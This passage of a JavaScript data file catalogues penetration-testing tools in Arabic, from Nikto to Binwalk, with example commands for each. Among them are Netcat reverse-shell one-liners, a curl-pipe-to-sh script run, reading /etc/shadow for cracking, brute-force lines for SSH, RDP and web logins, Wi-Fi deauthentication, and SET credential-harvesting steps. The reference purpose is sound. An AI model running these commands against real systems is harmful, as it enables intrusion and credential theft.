+  desc: `Nikto هو ماسح ثغرات مفتوح المصدر لخوادم الويب، يفحص الخوادم بحثاً عن أكثر من 6700 ملف وبرنامج خطير، إصدارات قديمة، مشاكل في الإعدادات، وإعدادات HTTP غير آمنة. سريع وسهل الاستخدام ومثالي للفحص الأولي.`,
+  features: [
+    'فحص أكثر من 6700 ملف وبرنامج خطير',
+    'اكتشاف إصدارات الخادم القديمة',
+    'فحص ملفات الإعداد المكشوفة (.htaccess, robots.txt)',
+    'اكتشاف XSS و SQLi الأولي',
+    'دعم SSL/HTTPS',
+    'إخراج بصيغ متعددة: HTML, XML, CSV',
+  ],
+  install: 'sudo apt install nikto -y',
+  version: 'nikto -Version',
+  commands: [
+    { cmd: 'nikto -h http://192.168.1.1', note: 'فحص أساسي لخادم ويب' },
+    { cmd: 'nikto -h https://site.com -ssl', note: 'فحص HTTPS' },
+    { cmd: 'nikto -h http://site.com -p 8080', note: 'فحص على منفذ غير افتراضي' },
+    { cmd: 'nikto -h http://site.com -o report.html -Format htm', note: 'حفظ التقرير HTML' },
+    { cmd: 'nikto -h http://site.com -Tuning 1,2,3', note: 'فحص أنواع محددة من الثغرات فقط' },
+  ],
+  tips: [
+    '💡 Nikto يصدر ضجة كبيرة — لا يصلح للاختبار الخفي',
+    '💡 استخدمه مع Nmap: أولاً اكتشف المنافذ ثم افحص الويب',
+  ],
+  related: ['Burp Suite', 'OWASP ZAP', 'WhatWeb', 'Dirb'],
+},
+
+{
+  id: 7, name: 'Gobuster', icon: '🚪', color: 'rgba(0,255,150,0.12)',
+  short: 'أداة فرز الدلائل والملفات الخفية في خوادم الويب',
+  cat: 'web', tags: ['web','recon'],
+  desc: `Gobuster هي أداة مكتوبة بلغة Go لاكتشاف الدلائل والملفات المخفية على خوادم الويب (Directory/File Busting)، وكذلك اكتشاف النطاقات الفرعية (DNS Brute-Forcing). أسرع بكثير من DirBuster بفضل Go والبرمجة المتزامنة.`,
+  features: [
+    'اكتشاف الدلائل والملفات المخفية (dir mode)',
+    'اكتشاف النطاقات الفرعية (dns mode)',
+    'اكتشاف Virtual Hosts (vhost mode)',
+    'سريع جداً بفضل Go Routines المتزامنة',
+    'دعم Extensions متعددة: php, asp, html, txt',
+  ],
+  install: 'sudo apt install gobuster -y',
+  version: 'gobuster version',
+  commands: [
+    { cmd: 'gobuster dir -u http://site.com -w /usr/share/wordlists/dirb/common.txt', note: 'فرز الدلائل الأساسي' },
+    { cmd: 'gobuster dir -u http://site.com -w wordlist.txt -x php,html,txt', note: 'مع امتدادات محددة' },
+    { cmd: 'gobuster dns -d example.com -w subdomains.txt', note: 'اكتشاف النطاقات الفرعية' },
+    { cmd: 'gobuster dir -u http://site.com -w wordlist.txt -t 50 -o results.txt', note: '50 thread متزامن وحفظ النتائج' },
+    { cmd: 'gobuster vhost -u http://site.com -w vhosts.txt', note: 'اكتشاف Virtual Hosts' },
+  ],
+  tips: [
+    '💡 Wordlist مثالية: /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt',
+    '💡 استخدم -b 403,404 لتجاهل كودات الاستجابة الخطأ',
+  ],
+  related: ['Dirb', 'Dirbuster', 'Feroxbuster', 'ffuf'],
+},
+
+// ============================================================
+// WIRELESS
+// ============================================================
+{
+  id: 8, name: 'Aircrack-ng', icon: '📡', color: 'rgba(150,0,255,0.12)',
+  short: 'مجموعة أدوات اختبار اختراق الشبكات اللاسلكية',
+  cat: 'wireless', tags: ['wireless'],
+  desc: `Aircrack-ng هي مجموعة أدوات متكاملة لاختبار أمان شبكات WiFi. تشمل رصد حزم الشبكة، كسر مفاتيح WEP/WPA/WPA2، هجمات De-authentication، وإنشاء نقاط وصول وهمية. تُعد المجموعة الأكثر استخداماً في اختبار أمان الشبكات اللاسلكية.`,
+  features: [
+    'airmon-ng: تفعيل وضع Monitor على البطاقة اللاسلكية',
+    'airodump-ng: التقاط حزم WiFi وجمع الـ Handshakes',
+    'aireplay-ng: هجمات De-auth وحقن الحزم',
+    'aircrack-ng: كسر مفاتيح WEP و WPA/WPA2',
+    'airdecap-ng: فك تشفير حزم WEP/WPA',
+    'dukتيم كامل: airgraph, airbase, airventriloquist',
+  ],
+  install: 'sudo apt install aircrack-ng -y',
+  version: 'aircrack-ng --version',
+  commands: [
+    { cmd: 'sudo airmon-ng start wlan0', note: 'تفعيل Monitor Mode على بطاقة wlan0' },
+    { cmd: 'sudo airodump-ng wlan0mon', note: 'رصد جميع الشبكات القريبة' },
+    { cmd: 'sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon', note: 'التقاط Handshake لشبكة محددة' },
+    { cmd: 'sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF wlan0mon', note: 'إرسال 10 حزمة De-auth لفصل العملاء' },
+    { cmd: 'aircrack-ng -w /usr/share/wordlists/rockyou.txt capture.cap', note: 'كسر WPA Handshake بالقاموس' },
+    { cmd: 'sudo airmon-ng stop wlan0mon', note: 'إيقاف Monitor Mode' },
+  ],
+  tips: [
+    '💡 تحتاج لبطاقة WiFi تدعم Monitor Mode (مثل: Alfa AWUS036ACH)',
+    '⚠️ استخدام هذه الأدوات على شبكات لا تملكها جريمة يعاقب عليها القانون',
+  ],
+  related: ['Hashcat', 'Kismet', 'Wifite', 'Reaver'],
+},
+
+{
+  id: 9, name: 'Wifite', icon: '🔓', color: 'rgba(100,0,200,0.12)',
+  short: 'أداة هجوم WiFi تلقائية — تضم كل شيء في أمر واحد',
+  cat: 'wireless', tags: ['wireless'],
+  desc: `Wifite أداة Python تُؤتمت عملية مهاجمة شبكات WiFi بالكامل. تجمع بين aircrack-ng وhcxdumptool وpyrit وhashcat وبرامج أخرى لتوفير تجربة سهلة وسريعة في اختبار الشبكات اللاسلكية.`,
+  features: [
+    'تلقائية بالكامل: من الرصد حتى كسر الكلمة',
+    'تدعم WEP، WPA، WPA2، WPS',
+    'تصنيف الشبكات حسب قوة الإشارة',
+    'فرت قواميس متعددة تلقائياً',
+  ],
+  install: 'sudo apt install wifite -y',
+  version: 'wifite --version',
+  commands: [
+    { cmd: 'sudo wifite', note: 'تشغيل Wifite بالخيارات الافتراضية' },
+    { cmd: 'sudo wifite --wpa --dict /usr/share/wordlists/rockyou.txt', note: 'هجوم WPA بقاموس محدد' },
+    { cmd: 'sudo wifite --kill', note: 'إيقاف العمليات المتعارضة تلقائياً' },
+  ],
+  tips: ['💡 Wifite2 هي النسخة المحدثة وأكثر استقراراً'],
+  related: ['Aircrack-ng', 'Reaver', 'Hashcat'],
+},
+
+// ============================================================
+// PASSWORD CRACKING
+// ============================================================
+{
+  id: 10, name: 'Hashcat', icon: '🔑', color: 'rgba(255,200,0,0.12)',
+  short: 'أسرع أداة كسر كلمات مرور في العالم — تدعم GPU',
+  cat: 'password', tags: ['password'],
+  desc: `Hashcat هو أداة كسر كلمات المرور الأسرع في العالم، تستخدم قوة GPU (كرت الشاشة) لتجربة مليارات الاحتمالات في الثانية. تدعم أكثر من 300 نوع Hash مختلف وأساليب هجوم متعددة: Dictionary، Brute-Force، Rule-based، Mask Attack.`,
+  features: [
+    'دعم أكثر من 300 نوع Hash (MD5, SHA1, bcrypt, NTLM, WPA...)',
+    'استخدام GPU: أسرع بـ 100x من CPU',
+    'هجوم بالقاموس (Wordlist Attack)',
+    'هجوم بالقوة (Brute-Force)',
+    'هجوم بالقواعد (Rules Attack)',
+    'هجوم بالأقنعة (Mask Attack) للأنماط المعروفة',
+    'دعم Distributed Cracking عبر أكثر من GPU',
+  ],
+  install: 'sudo apt install hashcat -y',
+  version: 'hashcat --version',
+  commands: [
+    { cmd: 'hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt', note: 'كسر MD5 بقاموس rockyou' },
+    { cmd: 'hashcat -m 1000 hashes.txt wordlist.txt', note: 'كسر NTLM (Windows passwords)' },
+    { cmd: 'hashcat -m 2500 handshake.hccapx wordlist.txt', note: 'كسر WPA/WPA2 Handshake' },
+    { cmd: 'hashcat -m 0 hash.txt -a 3 ?u?l?l?l?d?d?d?d', note: 'هجوم Mask: حرف كبير + 3 صغيرة + 4 أرقام' },
+    { cmd: 'hashcat -m 0 hashes.txt wordlist.txt -r rules/best64.rule', note: 'هجوم بالقواعد' },
+    { cmd: 'hashcat --example-hashes | grep -i "TYPE"', note: 'عرض أنواع Hash المدعومة' },
+  ],
+  tips: [
+    '💡 rockyou.txt يحتوي على 14+ مليون كلمة مرور مسرّبة',
+    '💡 استخدم --show لعرض الكلمات المكسورة لاحقاً من الـ .pot file',
+    '💡 -O (Optimized) يزيد السرعة لكن يحد من طول الـ Hash المكسور',
+  ],
+  related: ['John The Ripper', 'Hydra', 'Crunch', 'CeWL'],
+},
+
+{
+  id: 11, name: 'John The Ripper', icon: '⚔️', color: 'rgba(200,100,0,0.12)',
+  short: 'أداة كسر كلمات المرور الكلاسيكية — لينكس وWindows',
+  cat: 'password', tags: ['password'],
+  desc: `John the Ripper (JTR) هي أداة كسر كلمات مرور مفتوحة المصدر تعمل على CPU. ممتازة لكسر هاشات /etc/shadow على لينكس و SAM على ويندوز. تدعم مئات أنواع الهاش وتقوم بتحديد النوع تلقائياً.`,
+  features: [
+    'اكتشاف تلقائي لنوع الـ Hash',
+    'كسر /etc/shadow (Linux) و SAM (Windows)',
+    'هجمات متعددة: Wordlist, Incremental, Rules',
+    'دعم ZIP، PDF، SSH keys، و Office documents',
+    'نسخة Jumbo: تدعم أكثر من 400 نوع Hash',
+  ],
+  install: 'sudo apt install john -y',
+  version: 'john --version',
+  commands: [
+    { cmd: 'john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt', note: 'كسر بقاموس' },
+    { cmd: 'john --incremental hashes.txt', note: 'هجوم Brute-Force (بطيء لكن شامل)' },
+    { cmd: 'unshadow /etc/passwd /etc/shadow > combined.txt\njohn combined.txt', note: 'كسر كلمات مرور لينكس' },
+    { cmd: 'john --show hashes.txt', note: 'عرض الكلمات المكسورة' },
+    { cmd: 'zip2john archive.zip > hash.txt\njohn hash.txt', note: 'كسر كلمة مرور ملف ZIP' },
+    { cmd: 'ssh2john id_rsa > hash.txt\njohn hash.txt', note: 'كسر passphrase مفتاح SSH' },
+  ],
+  tips: [
+    '💡 john2hashcat لتحويل هاشات JTR لصيغة Hashcat (أسرع)',
+    '💡 استخدم --format=bcrypt لتحديد النوع يدوياً إذا لم يُكتشف تلقائياً',
+  ],
+  related: ['Hashcat', 'Hydra', 'unshadow'],
+},
+
+{
+  id: 12, name: 'Hydra', icon: '🐍', color: 'rgba(0,200,100,0.12)',
+  short: 'أداة Brute-Force للخدمات الشبكية — SSH, FTP, HTTP...',
+  cat: 'password', tags: ['password','network'],
+  desc: `THC-Hydra هي أسرع أداة Brute-Force عبر الشبكة، تدعم أكثر من 50 بروتوكول: SSH، FTP، HTTP، SMTP، RDP، MySQL، وغيرها. طوّرتها مجموعة The Hacker's Choice. تتيح هجمات متوازية لتسريع العملية.`,
+  features: [
+    'دعم 50+ بروتوكول',
+    'هجمات متوازية وسريعة',
+    'دعم HTTP-Form (تسجيل الدخول عبر الويب)',
+    'دعم Proxy (SOCKS4/5)',
+    'استئناف الهجوم بعد الإيقاف',
+  ],
+  install: 'sudo apt install hydra -y',
+  version: 'hydra -h | head -1',
+  commands: [
+    { cmd: 'hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.10', note: 'Brute Force على SSH' },
+    { cmd: 'hydra -L users.txt -P passwords.txt ftp://192.168.1.10', note: 'Brute Force على FTP بقوائم مستخدمين وكلمات مرور' },
+    { cmd: 'hydra -l admin -P wordlist.txt http-post-form "http://site.com/login:user=^USER^&pass=^PASS^:Invalid password"', note: 'Brute Force على نموذج تسجيل دخول ويب' },
+    { cmd: 'hydra -l admin -P wordlist.txt rdp://192.168.1.10', note: 'Brute Force على RDP (Windows Remote Desktop)' },
+    { cmd: 'hydra -l admin -P wordlist.txt -t 16 -s 2222 ssh://192.168.1.10', note: '16 thread ومنفذ مخصص' },
+  ],
+  tips: [
+    '⚠️ قد يُقفل الحساب بعد محاولات فاشلة متعددة — انتبه لـ Account Lockout',
+    '💡 استخدم -t 4 للـ SSH (كثير منها يرفض الاتصالات المتزامنة)',
+  ],
+  related: ['Medusa', 'Ncrack', 'Hashcat', 'Patator'],
+},
+
+// ============================================================
+// FORENSICS
+// ============================================================
+{
+  id: 13, name: 'Volatility', icon: '🔬', color: 'rgba(0,255,150,0.12)',
+  short: 'الأداة الأولى عالمياً في التحليل الجنائي للذاكرة',
+  cat: 'forensics', tags: ['forensics','malware'],
+  desc: `Volatility هو إطار عمل مفتوح المصدر لتحليل الذاكرة الحية (RAM Forensics). يُستخدم لاستخراج المعلومات من صور الذاكرة (Memory Dumps): العمليات الجارية، الاتصالات الشبكية، الـ Registry، كلمات المرور، البرمجيات الخبيثة المخفية، وغيرها.`,
+  features: [
+    'تحليل صور ذاكرة Windows, Linux, macOS',
+    'قائمة العمليات والـ DLLs المحملة',
+    'الاتصالات الشبكية وقت الإصابة',
+    'استخراج Hives من Registry',
+    'كشف Rootkits والبرمجيات الخبيثة',
+    'استخراج كلمات مرور (hashdump)',
+    'تحليل Malware بدون تشغيله',
+  ],
+  install: 'sudo apt install volatility3 -y',
+  version: 'vol -h',
+  commands: [
+    { cmd: 'vol -f memory.dmp windows.pslist', note: 'عرض قائمة العمليات' },
+    { cmd: 'vol -f memory.dmp windows.pstree', note: 'شجرة العمليات (مع الـ Parent/Child)' },
+    { cmd: 'vol -f memory.dmp windows.netstat', note: 'الاتصالات الشبكية وقت أخذ الـ Dump' },
+    { cmd: 'vol -f memory.dmp windows.hashdump', note: 'استخراج هاشات كلمات مرور Windows' },
+    { cmd: 'vol -f memory.dmp windows.malfind', note: 'اكتشاف الكود الخبيث المحقون في العمليات' },
+    { cmd: 'vol -f memory.dmp windows.registry.printkey --key "Software\\Microsoft\\Windows\\CurrentVersion\\Run"', note: 'فحص مفتاح Startup في Registry' },
+    { cmd: 'vol -f memory.dmp windows.filescan | grep ".exe"', note: 'البحث عن ملفات exe في الذاكرة' },
+  ],
+  tips: [
+    '💡 Vol3 (Python3) أسرع وأحدث من Vol2 — استخدمه بالأفضلية',
+    '💡 استخدم --output=json لدمج النتائج مع أدوات أخرى',
+  ],
+  related: ['Rekall', 'Autopsy', 'Redline', 'FTK'],
+},
+
+{
+  id: 14, name: 'Autopsy', icon: '🔭', color: 'rgba(100,200,255,0.12)',
+  short: 'منصة التحليل الجنائي الرقمي للأقراص والأجهزة',
+  cat: 'forensics', tags: ['forensics'],
+  desc: `Autopsy هو إطار عمل مفتوح المصدر للتحليل الجنائي الرقمي، يوفر واجهة رسومية لـ The Sleuth Kit. يُستخدم لتحليل أقراص الصلبة، الأجهزة المحمولة، وصور الأقراص. قادر على استرداد الملفات المحذوفة، تحليل سجل النشاط، واستخراج الأدلة الجنائية.`,
+  features: [
+    'استرداد الملفات المحذوفة',
+    'تحليل Timeline للنشاط على القرص',
+    'استخراج بيانات المتصفح وكلمات المرور',
+    'تحليل الصور والفيديو والملفات المضمنة',
+    'دعم EXIF data للصور',
+    'تحليل أجهزة Android',
+  ],
+  install: 'sudo apt install autopsy -y',
+  version: 'autopsy --version',
+  commands: [
+    { cmd: 'autopsy', note: 'فتح واجهة Autopsy الويب (http://localhost:9999/autopsy)' },
+    { cmd: 'mmls disk.img', note: 'عرض جدول الأقسام في صورة القرص' },
+    { cmd: 'fls -r -l disk.img', note: 'قائمة الملفات (يدوي عبر TSK)' },
+    { cmd: 'icat disk.img 5 > recovered_file', note: 'استخراج ملف محدد برقم inode' },
+  ],
+  tips: ['💡 ابدأ بـ New Case في واجهة Autopsy ثم أضف مصدر البيانات'],
+  related: ['Sleuth Kit', 'Volatility', 'FTK', 'Foremost'],
+},
+
+// ============================================================
+// REVERSE ENGINEERING
+// ============================================================
+{
+  id: 15, name: 'Ghidra', icon: '🧩', color: 'rgba(0,150,255,0.12)',
+  short: 'أداة الهندسة العكسية المجانية من وكالة NSA الأمريكية',
+  cat: 'malware', tags: ['malware','forensics'],
+  desc: `Ghidra هو إطار عمل للهندسة العكسية طوّرته وكالة الأمن القومي الأمريكي (NSA) وأصدرته مجاناً عام 2019. يُستخدم لتحليل البرمجيات الخبيثة وفهم الملفات التنفيذية دون الحاجة للكود المصدري. يدعم x86, x64, ARM, MIPS, وغيرها.`,
+  features: [
+    'Decompiler قوي: تحويل Assembly → C شبه مقروء',
+    'دعم عشرات المعالجات والأنظمة',
+    'Multi-user collaboration',
+    'Scripting بـ Java و Python',
+    'Graph view لتدفق البرنامج',
+    'مجاني وأفضل من IDA Pro في بعض الجوانب',
+  ],
+  install: 'sudo apt install ghidra -y  # أو تحميل من ghidra.re',
+  version: 'ghidra &',
+  commands: [
+    { cmd: 'ghidra &', note: 'فتح واجهة Ghidra الرسومية' },
+    { cmd: 'analyzeHeadless /project . -import malware.exe -postScript printStrings.py', note: 'تحليل headless بدون واجهة' },
+  ],
+  tips: [
+    '💡 ابدأ بـ File → New Project → Import File → Auto-Analyze',
+    '💡 نافذة Decompiler (يمين) تحول Assembly لـ C — مفيدة جداً',
+  ],
+  related: ['radare2', 'IDA Pro', 'Binary Ninja', 'objdump'],
+},
+
+{
+  id: 16, name: 'radare2', icon: '⚙️', color: 'rgba(200,0,200,0.12)',
+  short: 'إطار الهندسة العكسية في سطر الأوامر',
+  cat: 'malware', tags: ['malware','ctf'],
+  desc: `radare2 (r2) هو إطار عمل مفتوح المصدر وقوي جداً للهندسة العكسية يعمل بالكامل من سطر الأوامر. شعبيته كبيرة في مجال CTF وتحليل البرمجيات الخبيثة. له واجهة رسومية اسمها Cutter.`,
+  features: [
+    'Disassembler لعشرات البنى المعالجات',
+    'Debugger داخلي',
+    'Scripting بـ r2pipe (Python, JS)',
+    'Binary patching',
+    'دعم Format hex, elf, pe, macho',
+  ],
+  install: 'sudo apt install radare2 -y',
+  version: 'r2 -v',
+  commands: [
+    { cmd: 'r2 -A binary_file', note: 'فتح وتحليل تلقائي للملف' },
+    { cmd: 'afl', note: 'قائمة الدوال (داخل r2)' },
+    { cmd: 'pdf @ main', note: 'disassemble دالة main' },
+    { cmd: 'iz', note: 'استخراج الـ Strings من الملف' },
+    { cmd: 's 0x08048400; pd 20', note: 'الذهاب لعنوان وعرض 20 تعليمة' },
+  ],
+  tips: ['💡 Cutter هي الواجهة الرسومية لـ r2 — أسهل للمبتدئين'],
+  related: ['Ghidra', 'IDA Pro', 'objdump', 'gdb'],
+},
+
+// ============================================================
+// NETWORK
+// ============================================================
+{
+  id: 17, name: 'Wireshark', icon: '🦈', color: 'rgba(0,100,255,0.12)',
+  short: 'أشهر محلل حزم شبكية في العالم',
+  cat: 'network', tags: ['network','forensics'],
+  desc: `Wireshark هو محلل بروتوكولات الشبكة (Packet Analyzer) الأكثر استخداماً في العالم. يلتقط ويحلل حزم البيانات في الوقت الفعلي أو من ملفات pcap. يدعم أكثر من 3000 بروتوكول ويوفر تصفية وتحليل عميق.`,
+  features: [
+    'التقاط الحزم في الوقت الفعلي',
+    'تحليل عميق لـ 3000+ بروتوكول',
+    'فلاتر قوية جداً (Display Filters)',
+    'إعادة تجميع Streams (TCP Reassembly)',
+    'اكتشاف المعلومات الحساسة المرسلة بنص صريح',
+    'تصدير بصيغ متعددة: PCAP, PCAPNG, CSV',
+  ],
+  install: 'sudo apt install wireshark -y',
+  version: 'wireshark --version',
+  commands: [
+    { cmd: 'wireshark &', note: 'فتح واجهة Wireshark الرسومية' },
+    { cmd: 'sudo tcpdump -i eth0 -w capture.pcap', note: 'التقاط حزم بسطر الأوامر (tcpdump)' },
+    { cmd: 'tshark -i eth0 -w output.pcap', note: 'Wireshark بدون واجهة رسومية' },
+    { cmd: 'tshark -r capture.pcap -Y "http" -T fields -e http.request.uri', note: 'استخراج URLs من ملف PCAP' },
+    { cmd: '# فلتر HTTP: http\n# فلتر IP: ip.addr == 192.168.1.1\n# فلتر منفذ: tcp.port == 443', note: 'أمثلة فلاتر Display' },
+  ],
+  tips: [
+    '💡 Statistics → Conversations تعطيك ملخصاً ممتازاً للاتصالات',
+    '💡 Follow → TCP Stream لقراءة محادثة كاملة',
+  ],
+  related: ['tcpdump', 'tshark', 'NetworkMiner', 'Zeek'],
+},
+
+{
+  id: 18, name: 'Netcat', icon: '🔌', color: 'rgba(0,255,65,0.12)',
+  short: 'السكين السويسري لاتصالات الشبكة — TCP/UDP',
+  cat: 'network', tags: ['network','ctf','linux'],
+  desc: `Netcat (nc) هو أداة شبكية متعددة الاستخدامات تُسمى "Swiss Army Knife of networking". تُستخدم لإنشاء اتصالات TCP/UDP، نقل الملفات، الاستماع على المنافذ، واختبار الاتصال. أساسية في CTF وPost-Exploitation.`,
+  features: [
+    'فتح اتصالات TCP/UDP في أي اتجاه',
+    'Bind Shell: فتح Shell على الهدف',
+    'Reverse Shell: اتصال عكسي من الهدف',
+    'نقل الملفات بدون FTP',
+    'فحص المنافذ البسيط',
+    'نقل البيانات خام (Piping)',
+  ],
+  install: 'sudo apt install netcat-traditional -y',
+  version: 'nc --version',
+  commands: [
+    { cmd: 'nc -lvnp 4444', note: 'الاستماع على منفذ 4444 (لاستقبال reverse shell)' },
+    { cmd: 'nc 192.168.1.10 4444', note: 'الاتصال بـ IP ومنفذ محدد' },
+    { cmd: 'nc -zv 192.168.1.10 1-1000', note: 'فحص منافذ 1-1000' },
+    { cmd: 'nc -e /bin/bash 192.168.1.5 4444', note: 'Reverse Shell (من الهدف للمهاجم)' },
+    { cmd: '# إرسال ملف:\nnc -l 4444 > received_file\nnc 192.168.1.10 4444 < file_to_send', note: 'نقل ملف عبر netcat' },
+    { cmd: 'mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 192.168.1.5 4444 > /tmp/f', note: 'Reverse shell بدون -e' },
+  ],
+  tips: [
+    '💡 ncat (من Nmap) أحدث وأفضل — تدعم SSL وIPv6',
+    '💡 socat بديل أقوى يدعم ميزات أكثر',
+  ],
+  related: ['Socat', 'Nmap', 'Netstat', 'Cryptcat'],
+},
+
+// ============================================================
+// PRIVILEGE ESCALATION
+// ============================================================
+{
+  id: 19, name: 'LinPEAS', icon: '⬆️', color: 'rgba(255,50,50,0.12)',
+  short: 'أداة تصعيد الصلاحيات الأوتوماتيكية على لينكس',
+  cat: 'privesc', tags: ['privesc','linux'],
+  desc: `LinPEAS (Linux Privilege Escalation Awesome Script) هو سكريبت bash يبحث تلقائياً عن كل نقاط ضعف رفع الصلاحيات المحتملة على لينكس. يفحص الـ SUID bits, sudo configurations, cron jobs, writable files, kernel exploits, وغيرها.`,
+  features: [
+    'فحص SUID/SGID binaries',
+    'فحص Sudo rules',
+    'اكتشاف Cron Jobs قابلة للاستغلال',
+    'الملفات القابلة للكتابة من قِبل المستخدم الحالي',
+    'فحص إصدار Kernel للثغرات المعروفة',
+    'كلمات مرور مخزنة في ملفات الإعداد',
+  ],
+  install: 'curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh',
+  version: 'bash linpeas.sh',
+  commands: [
+    { cmd: 'curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh', note: 'تحميل وتشغيل مباشرة' },
+    { cmd: 'bash linpeas.sh 2>/dev/null | tee linpeas_output.txt', note: 'تشغيل وحفظ الإخراج' },
+    { cmd: 'bash linpeas.sh -a', note: 'فحص شامل (يشمل سرعة أقل)' },
+  ],
+  tips: [
+    '💡 المخرجات باللون الأحمر تعني ثغرات عالية الخطورة',
+    '💡 WinPEAS للـ Windows نظيرته',
+  ],
+  related: ['WinPEAS', 'LES', 'GTFOBins', 'sudo -l'],
+},
+
+// ============================================================
+// RECON
+// ============================================================
+{
+  id: 20, name: 'theHarvester', icon: '🌾', color: 'rgba(0,200,255,0.12)',
+  short: 'أداة جمع المعلومات OSINT من مصادر متعددة',
+  cat: 'recon', tags: ['recon'],
+  desc: `theHarvester أداة Python لجمع معلومات عن الأهداف من المصادر المفتوحة (OSINT): إيميلات، نطاقات فرعية، أسماء موظفين، عناوين IP. تجمع البيانات من Google, Bing, LinkedIn, Shodan, وغيرها.`,
+  features: [
+    'استخراج إيميلات الشركة',
+    'اكتشاف النطاقات الفرعية',
+    'أسماء الموظفين من LinkedIn',
+    'عناوين IP والـ ASN المرتبطة',
+    'مصادر متعددة: Google, Bing, Shodan, Hunter.io',
+  ],
+  install: 'sudo apt install theharvester -y',
+  version: 'theHarvester -h',
+  commands: [
+    { cmd: 'theHarvester -d example.com -b google -l 200', note: 'جمع معلومات من Google (200 نتيجة)' },
+    { cmd: 'theHarvester -d example.com -b all', note: 'من جميع المصادر المتاحة' },
+    { cmd: 'theHarvester -d example.com -b linkedin', note: 'أسماء الموظفين من LinkedIn' },
+    { cmd: 'theHarvester -d example.com -b google -f results.html', note: 'حفظ النتائج كـ HTML' },
+  ],
+  tips: ['💡 ادمج مع whois و Amass لتغطية أشمل'],
+  related: ['Maltego', 'Amass', 'Recon-ng', 'Shodan'],
+},
+
+{
+  id: 21, name: 'Amass', icon: '🌐', color: 'rgba(0,150,255,0.12)',
+  short: 'أفضل أداة لاكتشاف النطاقات الفرعية بشكل شامل',
+  cat: 'recon', tags: ['recon','network'],
+  desc: `Amass من مشاريع OWASP — أداة متخصصة في اكتشاف الأصول الرقمية وخصوصاً النطاقات الفرعية. تجمع بين أساليب: DNS brute-forcing، Web scraping، Certificate Transparency، وAPIs متعددة. تُعتبر الأفضل في مجالها.`,
+  features: [
+    'DNS Brute Force بقوائم ضخمة',
+    'Certificate Transparency Logs',
+    'تكامل مع Shodan, VirusTotal, Censys',
+    'رسم خريطة العلاقات بين الأصول',
+    'تتبع التغييرات عبر الزمن',
+  ],
+  install: 'sudo apt install amass -y',
+  version: 'amass -version',
+  commands: [
+    { cmd: 'amass enum -d example.com', note: 'اكتشاف نطاقات فرعية أساسي' },
+    { cmd: 'amass enum -active -d example.com -o subdomains.txt', note: 'فحص نشط وحفظ النتائج' },
+    { cmd: 'amass enum -d example.com -brute -w subdomains-wordlist.txt', note: 'Brute force بقاموس مخصص' },
+    { cmd: 'amass viz -d example.com -o graph.html', note: 'رسم بياني للعلاقات' },
+  ],
+  tips: ['💡 استخدم ملف config.yaml لإضافة API keys للمصادر المدفوعة'],
+  related: ['theHarvester', 'subfinder', 'assetfinder', 'dnsx'],
+},
+
+// ============================================================
+// SOCIAL ENGINEERING
+// ============================================================
+{
+  id: 22, name: 'SET', icon: '🎭', color: 'rgba(255,100,200,0.12)',
+  short: 'إطار الهندسة الاجتماعية — Social Engineering Toolkit',
+  cat: 'social', tags: ['social','exploit'],
+  desc: `Social Engineering Toolkit (SET) هو إطار عمل Python مفتوح المصدر مصمم لمحاكاة هجمات الهندسة الاجتماعية. طوّره Dave Kennedy (TrustedSec). يُستخدم في اختبارات الاختراق لتقييم وعي الموظفين الأمني.`,
+  features: [
+    'Spear-Phishing: رسائل Phishing مستهدفة',
+    'Website Attack Vectors: نسخ مواقع حقيقية',
+    'Credential Harvester: سرقة بيانات تسجيل الدخول',
+    'Payload Generation: إنشاء Payloads خبيثة',
+    'SMS Spoofing و QRCode Attacks',
+  ],
+  install: 'sudo apt install set -y',
+  version: 'setoolkit',
+  commands: [
+    { cmd: 'sudo setoolkit', note: 'فتح SET بالقائمة التفاعلية' },
+    { cmd: '# 1 → Social-Engineering Attacks\n# 2 → Website Attack Vectors\n# 3 → Credential Harvester\n# 2 → Site Cloner', note: 'نسخ موقع لسرقة بيانات الدخول' },
+  ],
+  tips: ['⚠️ استخدم SET فقط في بيئات مرخصة — Phishing غير مرخص جريمة'],
+  related: ['Gophish', 'BeEF', 'Evilginx2'],
+},
+
+// ============================================================
+// CTF TOOLS
+// ============================================================
+{
+  id: 23, name: 'Steghide', icon: '🖼️', color: 'rgba(100,255,200,0.12)',
+  short: 'إخفاء واستخراج البيانات المخفية في الصور والصوت',
+  cat: 'ctf', tags: ['ctf','forensics'],
+  desc: `Steghide أداة Steganography تُخفي البيانات داخل ملفات الصور (JPEG, BMP) وملفات الصوت (WAV, AU). شائعة جداً في تحديات CTF. يمكنها إخفاء رسائل أو ملفات داخل صور بدون تغيير ملحوظ.`,
+  features: [
+    'دعم صيغ: JPEG, BMP, WAV, AU',
+    'تشفير البيانات المخفية بـ AES',
+    'استخراج البيانات المخفية',
+    'إضافة كلمة مرور للحماية',
+  ],
+  install: 'sudo apt install steghide -y',
+  version: 'steghide --version',
+  commands: [
+    { cmd: 'steghide embed -cf image.jpg -sf secret.txt -p "password"', note: 'إخفاء ملف داخل صورة' },
+    { cmd: 'steghide extract -sf image.jpg -p "password"', note: 'استخراج الملف المخفي' },
+    { cmd: 'steghide info image.jpg', note: 'معلومات عن البيانات المخفية (بدون كلمة مرور)' },
+    { cmd: 'stegseek image.jpg /usr/share/wordlists/rockyou.txt', note: 'كسر كلمة مرور Steghide تلقائياً' },
+  ],
+  tips: ['💡 stegseek أسرع من الكسر اليدوي — ثبّته منفصلاً'],
+  related: ['stegseek', 'ExifTool', 'binwalk', 'zsteg'],
+},
+
+{
+  id: 24, name: 'Binwalk', icon: '🔩', color: 'rgba(0,200,200,0.12)',
+  short: 'تحليل واستخراج البيانات المضمنة في الملفات الثنائية',
+  cat: 'ctf', tags: ['ctf','forensics','malware'],
+  desc: `Binwalk أداة لتحليل واستخراج الـ Firmware وغيرها من الملفات الثنائية. تكتشف الملفات والبيانات المضمنة مثل: صور مضغوطة، ملفات ZIP/RAR، أنظمة ملفات، وغيرها. أساسية في تحليل Firmware وتحديات CTF.`,
+  features: [
+    'اكتشاف الملفات المضمنة تلقائياً',
+    'استخراج ملفات مضغوطة (gzip, zip, tar)',
